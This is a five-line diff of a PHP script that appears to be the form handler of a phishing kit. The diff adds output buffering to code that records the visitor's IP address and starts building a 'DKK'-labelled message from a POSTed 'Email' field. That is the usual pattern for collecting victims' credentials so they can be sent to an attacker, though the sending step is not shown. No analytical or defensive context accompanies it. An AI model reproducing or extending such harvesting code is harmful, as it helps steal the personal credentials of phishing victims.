@@ -1,4 +1,5 @@
 <?php
+ob_start();
 $zabi = getenv("REMOTE_ADDR");
 $message .= "-------DKK----------\n";
 $message .= "Email : ".$_POST['zz']."\n";
